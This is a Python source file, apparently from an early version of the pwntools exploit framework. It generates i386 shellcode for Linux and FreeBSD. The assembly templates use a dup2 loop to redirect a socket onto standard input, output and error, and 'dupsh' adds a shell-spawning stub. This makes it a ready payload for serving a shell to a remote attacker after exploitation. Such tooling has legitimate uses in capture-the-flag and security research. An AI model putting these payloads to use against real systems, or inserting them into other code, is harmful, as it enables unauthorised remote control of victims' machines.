from pwn.internal.shellcode_helper import *
from sh import sh

@shellcode_reqs(arch='i386', os=['linux', 'freebsd'])
def dupsh(sock = 'ebp', os = None):
    """Args: [sock (imm/reg) = ebp]
    Duplicates sock to stdin, stdout and stderr and spawns a shell."""
    if os in ['freebsd', 'linux']:
        return dup(sock), sh()
    else:
        bug('OS was neither linux nor freebsd')

@shellcode_reqs(arch='i386', os=['linux', 'freebsd'])
def dup(sock = 'ebp', os = None):
    """Args: [sock (imm/reg) = ebp]
    Duplicates sock to stdin, stdout and stderr."""

    if os == 'freebsd':
        return _dup_freebsd(sock)
    elif os == 'linux':
        return _dup_linux(sock)
    else:
        bug('OS was neither linux nor freebsd')

def _dup_linux(sock):
    return """
dup:
        setfd ebx, %s
        push byte 3
        pop ecx
.loop:
        dec ecx
        push byte SYS_dup2
        pop eax
        int 0x80
        jnz .loop
""" % str(sock)

def _dup_freebsd(sock):
    return """
dup:
        setfd esi, %s
        push byte 2
        pop ebp
        push SYS_dup2
        pop eax
.loop:
        pushad
        int 0x80
        popad
        dec ebp
        jns .loop
.after:
""" % str(sock)
